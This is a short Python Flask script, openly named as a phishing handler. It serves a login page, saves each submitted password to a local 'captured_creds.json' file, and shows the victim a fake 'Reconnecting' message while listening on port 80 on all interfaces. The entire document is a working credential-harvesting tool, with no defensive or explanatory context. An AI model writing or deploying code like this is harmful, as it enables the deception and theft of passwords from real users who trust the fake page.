from flask import Flask, request, render_template, redirect
import json

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def phishing():
    if request.method == "POST":
        password = request.form.get("password")
        with open("captured_creds.json", "a") as f:
            f.write(json.dumps({"password": password}) + "\n")
        return "<h3>Reconnecting... please wait.</h3>"

    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
